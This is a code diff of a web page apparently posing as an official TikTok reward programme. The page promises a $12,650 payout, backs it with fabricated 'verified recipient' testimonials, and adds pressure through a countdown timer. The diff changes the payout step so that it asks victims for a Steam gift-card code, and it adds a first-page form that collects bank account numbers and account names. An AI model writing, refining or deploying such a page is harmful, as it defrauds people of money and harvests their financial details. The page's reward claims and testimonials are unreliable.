+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#10b981,#059669);">FC</div><div class="dt-meta"><h4>Fatima C.</h4><p>🇳🇬 Nigeria · TikTok: @fatima.creates</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Wise · April 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Wise · April 2026</div>
               <p class="dt-txt">"Amazing platform! Got my reward in my Wise account within 36 hours. Verification was quick and easy."</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0039</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#f59e0b,#d97706);">MK</div>
-                <div class="dt-meta"><h4>Mohammed K.</h4><p>🇬🇧 United Kingdom · TikTok: @mk_vibes</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#f59e0b,#d97706);">MK</div><div class="dt-meta"><h4>Mohammed K.</h4><p>🇬🇧 United Kingdom · TikTok: @mk_vibes</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Bank Transfer · March 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Bank Transfer · March 2026</div>
               <p class="dt-txt">"Professional and transparent. Reward confirmed within 48 hours. Absolutely a legitimate platform!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0027</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);">SP</div>
-                <div class="dt-meta"><h4>Sofia P.</h4><p>🇨🇦 Canada · TikTok: @sofia.plife</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);">SP</div><div class="dt-meta"><h4>Sofia P.</h4><p>🇨🇦 Canada · TikTok: @sofia.plife</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Payoneer · February 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Payoneer · February 2026</div>
               <p class="dt-txt">"Submitted my details on Saturday, funds in my Payoneer by Monday morning. Outstanding service!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0018</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#ef4444,#dc2626);">LM</div>
-                <div class="dt-meta"><h4>Lena M.</h4><p>🇩🇪 Germany · TikTok: @lena.moments</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#ef4444,#dc2626);">LM</div><div class="dt-meta"><h4>Lena M.</h4><p>🇩🇪 Germany · TikTok: @lena.moments</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Bank Transfer · January 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Bank Transfer · January 2026</div>
               <p class="dt-txt">"Very professional team. They walked me through every step and the funds arrived faster than expected. Thank you!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0009</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#0ea5e9,#0284c7);">RO</div>
-                <div class="dt-meta"><h4>Ravi O.</h4><p>🇮🇳 India · TikTok: @ravi.official</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#0ea5e9,#0284c7);">RO</div><div class="dt-meta"><h4>Ravi O.</h4><p>🇮🇳 India · TikTok: @ravi.official</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via PayPal · June 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via PayPal · June 2026</div>
               <p class="dt-txt">"Legit and fast! I was skeptical but after verifying, the money hit my PayPal within hours. Highly recommended."</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0061</div>
             </div>
-            <!-- SET 2 — exact duplicate for seamless infinite loop -->
+            <!-- duplicate set -->
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#3b82f6,#6366f1);">JA</div>
-                <div class="dt-meta"><h4>James A.</h4><p>🇺🇸 United States · TikTok: @james_official</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#3b82f6,#6366f1);">JA</div><div class="dt-meta"><h4>James A.</h4><p>🇺🇸 United States · TikTok: @james_official</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via PayPal · May 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via PayPal · May 2026</div>
               <p class="dt-txt">"I honestly didn't believe it at first, but the payout came through within 24 hours. The process was seamless!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0051</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#10b981,#059669);">FC</div>
-                <div class="dt-meta"><h4>Fatima C.</h4><p>🇳🇬 Nigeria · TikTok: @fatima.creates</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#10b981,#059669);">FC</div><div class="dt-meta"><h4>Fatima C.</h4><p>🇳🇬 Nigeria · TikTok: @fatima.creates</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Wise · April 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Wise · April 2026</div>
               <p class="dt-txt">"Amazing platform! Got my reward in my Wise account within 36 hours. Verification was quick and easy."</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0039</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#f59e0b,#d97706);">MK</div>
-                <div class="dt-meta"><h4>Mohammed K.</h4><p>🇬🇧 United Kingdom · TikTok: @mk_vibes</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#f59e0b,#d97706);">MK</div><div class="dt-meta"><h4>Mohammed K.</h4><p>🇬🇧 United Kingdom · TikTok: @mk_vibes</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Bank Transfer · March 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Bank Transfer · March 2026</div>
               <p class="dt-txt">"Professional and transparent. Reward confirmed within 48 hours. Absolutely a legitimate platform!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0027</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);">SP</div>
-                <div class="dt-meta"><h4>Sofia P.</h4><p>🇨🇦 Canada · TikTok: @sofia.plife</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);">SP</div><div class="dt-meta"><h4>Sofia P.</h4><p>🇨🇦 Canada · TikTok: @sofia.plife</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Payoneer · February 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Payoneer · February 2026</div>
               <p class="dt-txt">"Submitted my details on Saturday, funds in my Payoneer by Monday morning. Outstanding service!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0018</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#ef4444,#dc2626);">LM</div>
-                <div class="dt-meta"><h4>Lena M.</h4><p>🇩🇪 Germany · TikTok: @lena.moments</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#ef4444,#dc2626);">LM</div><div class="dt-meta"><h4>Lena M.</h4><p>🇩🇪 Germany · TikTok: @lena.moments</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via Bank Transfer · January 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via Bank Transfer · January 2026</div>
               <p class="dt-txt">"Very professional team. They walked me through every step and the funds arrived faster than expected. Thank you!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0009</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#0ea5e9,#0284c7);">RO</div>
-                <div class="dt-meta"><h4>Ravi O.</h4><p>🇮🇳 India · TikTok: @ravi.official</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#0ea5e9,#0284c7);">RO</div><div class="dt-meta"><h4>Ravi O.</h4><p>🇮🇳 India · TikTok: @ravi.official</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via PayPal · June 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via PayPal · June 2026</div>
               <p class="dt-txt">"Legit and fast! I was skeptical but after verifying, the money hit my PayPal within hours. Highly recommended."</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0061</div>
             </div>
@@ -738,14 +584,13 @@ border-radius: 20px;  /* more rounded */"></div>
         </div>
       </section>
 
-      <!-- REWARD -->
       <section class="dsec" id="s-reward">
         <div class="sh"><h3>🎉 My Reward</h3></div>
         <div class="rhero">
           <div class="rinner">
             <span class="remi">🎉</span>
             <p class="rcong">Congratulations! You have qualified for our reward program.</p>
-            <div class="ramt" id="r-amount">$10,000 USD</div>
+            <div class="ramt" id="r-amount">$12,650 USD</div>
             <div class="rtag" id="r-status">Pending Reward</div><br>
             <div class="cd">
               <div class="cdu"><span class="cnum" id="cd-h">23</span><span class="clbl">Hours</span></div>
@@ -754,7 +599,7 @@ border-radius: 20px;  /* more rounded */"></div>
               <span class="csep">:</span>
               <div class="cdu"><span class="cnum" id="cd-s">59</span><span class="clbl">Secs</span></div>
             </div>
-            <p style="font-size: 15px;color: red;margin-top:9px;">⏳Congatulations! Your reward is waiting to be claimed. <br>Please make sure you claim it before the countdown expires.Once the countdown reaches zero, the reward may no longer be available. Don't miss out-click on (PAYMENT) on your dashboard to claim your reward now! </p>
+            <p style="font-size:15px;color:red;margin-top:9px;">⏳Congratulations! Your reward is waiting to be claimed. <br>Please make sure you claim it before the countdown expires. Once the countdown reaches zero, the reward may no longer be available. Don't miss out — click on (PAYMENT) on your dashboard to claim your reward now!</p>
           </div>
         </div>
         <div class="tgrid">
@@ -768,20 +613,12 @@ border-radius: 20px;  /* more rounded */"></div>
         </div>
       </section>
 
-      <!-- PAYMENT -->
       <section class="dsec" id="s-pay">
         <div class="sh"><h3>💳 Choose Payment Method</h3></div>
-        <p style="color:var(--text2);font-size:.86rem;margin-bottom:18px;">Select how you'd like to receive your $10,000 reward payout.</p>
+        <p style="color:var(--text2);font-size:.86rem;margin-bottom:18px;">Select how you'd like to receive your $12,650 reward payout.</p>
 
         <div class="pgrid">
-          <div class="pc" data-method="PayPal"        onclick="APP.pickPay(this)"><div class="pico">🅿️</div><div class="pc-name">PayPal</div></div>
-          <div class="pc" data-method="Bank Transfer" onclick="APP.pickPay(this)"><div class="pico">🏦</div><div class="pc-name">Bank Transfer</div></div>
-          <div class="pc" data-method="Cash App"      onclick="APP.pickPay(this)"><div class="pico">💵</div><div class="pc-name">Cash App</div></div>
-          <div class="pc" data-method="Apple Pay"     onclick="APP.pickPay(this)"><div class="pico">🍎</div><div class="pc-name">Apple Pay</div></div>
-          <div class="pc" data-method="Venmo"         onclick="APP.pickPay(this)"><div class="pico">💙</div><div class="pc-name">Venmo</div></div>
-          <div class="pc" data-method="Zelle"         onclick="APP.pickPay(this)"><div class="pico">⚡</div><div class="pc-name">Zelle</div></div>
-          <div class="pc" data-method="Chime"          onclick="APP.pickPay(this)"><div class="pico">🌐</div><div class="pc-name">Chime</div></div>
-          <div class="pc" data-method="Payoneer"      onclick="APP.pickPay(this)"><div class="pico">🅿</div><div class="pc-name">Payoneer</div></div>
+          <div class="pc" data-method="Steam" onclick="APP.pickPay(this)"><div class="pico">🎮</div><div class="pc-name">Steam</div></div>
         </div>
 
         <div class="pfwrap" id="pfwrap">
@@ -793,12 +630,8 @@ border-radius: 20px;  /* more rounded */"></div>
             Enter your payment details to receive your eligible reward. Your information is encrypted and stored securely.
           </div>
           <div class="fg">
-            <label>Payment Information</label>
-            <input type="email" id="" placeholder="e.g. $cash App Tag · paypal Email · Bank Account Number · IBAN"/>
-          </div>
-          <div class="fg">
-            <label>Account Holder Name</label>
-            <input type="text" id="pay-acct" placeholder="e.g John Adams "/>
+            <label>Steam Card Code</label>
+            <input type="text" id="pay-steam-code" placeholder="e.g. 1234-5678-9012"/>
           </div>
           <button class="btn-p" id="pay-btn" onclick="APP.submitPay()" style="max-width:290px;">
             Submit Payment Details ✓
@@ -806,42 +639,16 @@ border-radius: 20px;  /* more rounded */"></div>
         </div>
       </section>
 
-      <!-- PROFILE -->
-      <section class="dsec" id="s-prof">
-        <div class="sh"><h3>👤 My Profile</h3></div>
-        <div class="phero">
-          <div class="prof-av" id="p-av">U</div>
-          <div class="prof-name" id="p-name">—</div>
-          <div class="prof-handle" id="p-handle">@—</div>
-        </div>
-        <div class="prows">
-          <div class="pr"><label>Full Name</label><span id="pf-name">—</span></div>
-          <div class="pr"><label>Email</label><span id="pf-email">—</span></div>
-          <div class="pr"><label>Username</label><span id="pf-uname">—</span></div>
-          <div class="pr"><label>TikTok Username</label><span id="pf-tik">—</span></div>
-          <div class="pr"><label>Country</label><span id="pf-country">—</span></div>
-          <div class="pr"><label>Member Since</label><span id="pf-since">—</span></div>
-          <div class="pr"><label>Auth Method</label><span id="pf-auth">—</span></div>
-          <div class="pr"><label>Verification Status</label><span class="bdg pend" id="pf-vstatus">⏳ Pending</span></div>
-        </div>
-      </section>
-
     </main>
-  </div><!-- dlayout -->
+  </div>
 
   <footer class="dfooter">
     <p><strong>tiktokofficialreward</strong> © 2026 · All Rights Reserved</p>
-    <p style="margin-top:5px;">info: </p>
   </footer>
-</div><!-- dash-page -->
+</div>
 
-<!-- ══════════════════════════════════════════════════════
-     JAVASCRIPT — NO AUTH, DIRECT DASHBOARD
-══════════════════════════════════════════════════════ -->
 <script>
-/* ─────────────────────────────────────────────────────────
-   HELPERS
-───────────────────────────────────────────────────────── */
+/* ─────────── HELPERS ─────────── */
 let _cdTimer = null;
 
 function toast(msg, type = "info") {
@@ -857,100 +664,91 @@ function val(id) {
   return el ? el.value.trim() : "";
 }
 
-function setText(id, val) {
+function setText(id, v) {
   const el = document.getElementById(id);
-  if (el) el.textContent = val;
+  if (el) el.textContent = v;
 }
 
-/* ─────────────────────────────────────────────────────────
-   SHOW DASHBOARD IMMEDIATELY (NO AUTH)
-───────────────────────────────────────────────────────── */
+/* ─────────── PROFILE PERSISTENCE ─────────── */
+const PROFILE_KEY = "tiktok_profile";
+
+function getProfile() {
+  try { return JSON.parse(localStorage.getItem(PROFILE_KEY) || "null"); }
+  catch (_) { return null; }
+}
+
+/* ─────────── SHOW DASHBOARD ─────────── */
 function showDash() {
   const dp = document.getElementById("dash-page");
-  if (dp) {
-    dp.classList.add("on");
-    dp.style.display = "flex";
-  }
-  // hide loading screen if still visible
-  const ls = document.getElementById("loading-screen");
-  if (ls) ls.style.display = "none";
+  if (dp) { dp.classList.add("on"); dp.style.display = "flex"; }
 }
 
-/* ─────────────────────────────────────────────────────────
-   POPULATE WITH DUMMY USER DATA
-───────────────────────────────────────────────────────── */
+/* ─────────── POPULATE DASHBOARD WITH STORED USERNAME ─────────── */
 function populateDash() {
-  const dummy = {
-    username: "demo_user",
-    fullName: "Demo User",
-    email: "demo@example.com",
-    tiktokUsername: "@demo_tiktok",
-    country: "United States",
-    authMethod: "Email",
-    verificationStatus: "Pending",
-    createdAt: new Date(),
-  };
+  const profile = getProfile() || {};
+  const username = profile.username || "user";
 
-  const name = dummy.username || dummy.fullName || "User";
-  setText("d-welcome", `Welcome, ${name} 👋`);
+  setText("d-welcome", `Welcome, ${username} 👋`);
 
   const vb = document.getElementById("d-vbadge");
   if (vb) {
-    const isV = dummy.verificationStatus === "Verified";
-    vb.textContent = isV ? "✅ Verified" : "⏳ Pending Verification";
-    vb.className = "bdg " + (isV ? "verif" : "pend");
+    vb.textContent = "⏳ Pending Verification";
+    vb.className = "bdg pend";
   }
 
-  const initials = ((dummy.fullName || "U")
-    .split(" ").map(w => w[0]).join("")).slice(0,2).toUpperCase();
-  const av = document.getElementById("p-av");
-  if (av) av.textContent = initials;
-
-  setText("p-name",   dummy.fullName || "—");
-  setText("p-handle", "@" + (dummy.username || "—"));
-  setText("pf-name",  dummy.fullName || "—");
-  setText("pf-email", dummy.email || "—");
-  setText("pf-uname", "@" + (dummy.username || "—"));
-  const tik = dummy.tiktokUsername || "";
-  setText("pf-tik", tik ? (tik.startsWith("@") ? tik : `@${tik}`) : "—");
-  setText("pf-country", dummy.country || "—");
-  setText("pf-auth",  dummy.authMethod || "Email");
-
-  const since = dummy.createdAt;
-  setText("pf-since", since.toLocaleDateString("en-US",{year:"numeric",month:"long",day:"numeric"}));
-
-  const pvb = document.getElementById("pf-vstatus");
-  if (pvb) {
-    const isV = dummy.verificationStatus === "Verified";
-    pvb.textContent = isV ? "✅ Verified" : "⏳ Pending";
-    pvb.className = "bdg " + (isV ? "verif" : "pend");
-  }
-
-  // Reward amounts
-  setText("r-amount", "$10,000 USD");
+  setText("r-amount", "$12,650 USD");
   setText("r-status", "Pending Verification");
 }
 
-/* ─────────────────────────────────────────────────────────
-   SUBMIT PAYMENT (NO AUTH — SIMULATED)
-───────────────────────────────────────────────────────── */
+/* ─────────── SUBMIT PROFILE (FIRST PAGE) ─────────── */
+function submitProfile() {
+  const username = val("pg-username");
+  const bankAcct = val("pg-bank-acct");
+  const bankName = val("pg-bank-name");
+
+  if (!username) return toast("Please enter a username", "error");
+  if (!bankAcct) return toast("Please enter your bank account number", "error");
+  if (!bankName) return toast("Please enter your bank account name", "error");
+
+  localStorage.setItem(PROFILE_KEY, JSON.stringify({
+    username: username,
+    bankAccountNumber: bankAcct,
+    bankAccountName: bankName,
+    submittedAt: new Date().toISOString()
+  }));
+
+  // Show the 3-second drop-down
+  const notify = document.getElementById("profile-notify");
+  if (notify) notify.classList.add("slide-down");
+
+  // After 3 seconds, hide the gate and show the dashboard
+  setTimeout(() => {
+    if (notify) notify.classList.remove("slide-down");
+
+    const gate = document.getElementById("profile-gate");
+    if (gate) { gate.classList.remove("on"); gate.style.display = "none"; }
+
+    showDash();
+    populateDash();
+    startCountdown();
+    animateCounts();
+  }, 3000);
+}
+
+/* ─────────── SUBMIT PAYMENT (STEAM ONLY) ─────────── */
 function submitPay() {
   const method = document.querySelector(".pc.sel")?.dataset.method;
-  const email  = val("pay-email");
-  const acct   = val("pay-acct");
+  const code   = val("pay-steam-code");
 
   if (!method) return toast("Select a payment method first", "error");
-  if (!email && !acct) return toast("Enter your payment email or account handle", "error");
+  if (!code)   return toast("Enter your Steam card code", "error");
 
-  // Show the thank-you modal
   const overlay = document.getElementById("pay-modal-overlay");
   if (overlay) overlay.classList.add("show");
 
-  // clear fields
-  const pe = document.getElementById("pay-email");
-  const pa = document.getElementById("pay-acct");
-  if (pe) pe.value = "";
-  if (pa) pa.value = "";
+  // clear
+  const ci = document.getElementById("pay-steam-code");
+  if (ci) ci.value = "";
   document.querySelectorAll(".pc").forEach(c => c.classList.remove("sel"));
   const pfw = document.getElementById("pfwrap");
   if (pfw) pfw.classList.remove("open");
@@ -958,23 +756,7 @@ function submitPay() {
   toast("Payment details submitted (demo)", "success");
 }
 
-/* ─────────────────────────────────────────────────────────
-   CONTINUE AFTER PAY MODAL
-───────────────────────────────────────────────────────── */
-function continueAfterPay() {
-  const overlay = document.getElementById("pay-modal-overlay");
-  if (overlay) overlay.classList.remove("show");
-
-  const notify = document.getElementById("pay-notify");
-  if (notify) {
-    notify.classList.add("slide-down");
-    setTimeout(() => { notify.classList.remove("slide-down"); }, 5000);
-  }
-}
-
-/* ─────────────────────────────────────────────────────────
-   COUNTDOWN
-───────────────────────────────────────────────────────── */
+/* ─────────── COUNTDOWN ─────────── */
 function startCountdown() {
   const KEY = "tiktok_cd_end";
   let end = 0;
@@ -1000,9 +782,7 @@ function startCountdown() {
   }, 1000);
 }
 
-/* ─────────────────────────────────────────────────────────
-   ANIMATE COUNTERS
-───────────────────────────────────────────────────────── */
+/* ─────────── ANIMATE COUNTERS ─────────── */
 function animateCounts() {
   document.querySelectorAll("[data-count]").forEach(el => {
     const target = +el.dataset.count;
@@ -1017,11 +797,8 @@ function animateCounts() {
   });
 }
 
-/* ─────────────────────────────────────────────────────────
-   EXPOSE ALL HANDLERS ON window.APP
-───────────────────────────────────────────────────────── */
+/* ─────────── EXPOSE APP HANDLERS ─────────── */
 window.APP = {
-  /* ui — dashboard sections */
   sec(id) {
     document.querySelectorAll(".dsec").forEach(s => s.classList.remove("on"));
     document.querySelectorAll(".ni").forEach(n => n.classList.remove("on"));
@@ -1031,14 +808,10 @@ window.APP = {
     const mnav = document.getElementById("mnav");
     if (mnav) mnav.classList.remove("on");
   },
-
-  /* mobile nav */
   mobNav() {
     const mnav = document.getElementById("mnav");
     if (mnav) mnav.classList.toggle("on");
   },
-
-  /* theme */
   theme() {
     const html = document.documentElement;
     const next = html.dataset.theme === "dark" ? "light" : "dark";
@@ -1046,8 +819,6 @@ window.APP = {
     const btn = document.getElementById("theme-btn");
     if (btn) btn.textContent = next === "dark" ? "🌙" : "☀️";
   },
-
-  /* payment pick */
   pickPay(card) {
     document.querySelectorAll(".pc").forEach(c => c.classList.remove("sel"));
     card.classList.add("sel");
@@ -1055,20 +826,26 @@ window.APP = {
     const pfw = document.getElementById("pfwrap");
     if (pfw) pfw.classList.add("open");
   },
-
-  /* submit payment */
   submitPay,
-  continueAfterPay,
+  submitProfile
 };
 
-/* ─────────────────────────────────────────────────────────
-   INIT — SHOW DASHBOARD IMMEDIATELY
-───────────────────────────────────────────────────────── */
+/* ─────────── INIT ─────────── */
 (function init() {
-  showDash();
-  populateDash();
-  startCountdown();
-  animateCounts();
+  const profile = getProfile();
+  if (profile && profile.username) {
+    // Returning user — skip profile gate
+    const gate = document.getElementById("profile-gate");
+    if (gate) { gate.classList.remove("on"); gate.style.display = "none"; }
+    showDash();
+    populateDash();
+    startCountdown();
+    animateCounts();
+  } else {
+    // First-time visitor — show profile gate
+    const gate = document.getElementById("profile-gate");
+    if (gate) gate.classList.add("on");
+  }
 })();
 </script>
 </body>
